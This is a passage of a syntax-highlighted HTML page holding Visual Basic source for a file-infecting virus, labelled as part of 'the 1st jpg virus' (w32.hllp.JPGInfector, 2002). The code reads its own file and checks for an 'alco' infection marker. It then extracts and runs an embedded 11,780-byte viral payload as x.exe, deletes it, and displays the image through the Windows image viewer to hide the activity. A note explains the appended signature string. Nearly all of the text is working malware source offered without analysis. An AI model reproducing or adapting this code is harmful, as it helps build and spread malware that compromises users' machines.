</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc12">comm</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">ffile</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">lenhost</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">check</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">mark</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.Path</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">jpgvir</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">ffile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FreeFile</span><span class="sc0">
</span><span class="sc12">comm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Command</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc12">comm</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#ffile
</span><span class="sc7">lenhost</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">ffile</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc7">check</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc7">lenhost</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc9">#ffile, , check
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#ffile
</span><span class="sc7">mark</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">check</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">mark</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"alco"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc12">comm</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#ffile
</span><span class="sc7">HostLength</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">ffile</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">11780</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">HostCode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc7">HostLength</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">vircode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc2">11780</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc9">#ffile, , HostCode
</span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc9">#ffile, , vircode
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#ffile
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"x.exe"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Write</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#ffile
</span><span class="sc7">Put</span><span class="sc0"> </span><span class="sc9">#ffile, , vircode
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#ffile
</span><span class="sc7">DoEvents</span><span class="sc0">
</span><span class="sc1">'borrowed from murkry's vb5 virus
</span><span class="sc7">idProg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Shell</span><span class="sc6">(</span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"x.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNormalFocus</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">hProg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">OpenProcess</span><span class="sc6">(</span><span class="sc7">PROCESS_ALL_ACCESS</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">idProg</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">GetExitCodeProcess</span><span class="sc0"> </span><span class="sc7">hProg</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">iExit</span><span class="sc0">
</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">iExit</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">STILL_ACTIVE</span><span class="sc0">
</span><span class="sc7">DoEvents</span><span class="sc0">
</span><span class="sc7">GetExitCodeProcess</span><span class="sc0"> </span><span class="sc7">hProg</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">iExit</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">
</span><span class="sc7">Kill</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"x.exe"</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">Shell</span><span class="sc0"> </span><span class="sc4">"rundll32.exe C:\WINDOWS\SYSTEM\SHIMGVW.DLL,ImageView_Fullscreen "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc12">comm</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'proof.002 - part of the 1st jpg virus by alcopaul
'w32.hllp.JPGInfector
'june 13, 2002
</span><span class="sc0">
</span><span class="sc6">===============</span><span class="sc0">
</span><span class="sc7">signature</span><span class="sc0">
</span><span class="sc6">===============</span><span class="sc0">
</span><span class="sc7">alco</span><span class="sc0">

</span><span class="sc6">--------------</span><span class="sc0">
</span><span class="sc7">Signature</span><span class="sc0"> </span><span class="sc3">string</span><span class="sc0"> </span><span class="sc7">that</span><span class="sc0"> </span><span class="sc7">will</span><span class="sc0"> </span><span class="sc7">be</span><span class="sc0"> </span><span class="sc7">appended</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc7">the</span><span class="sc0"> </span><span class="sc7">virus</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc7">alco</span></div></body>
</html>
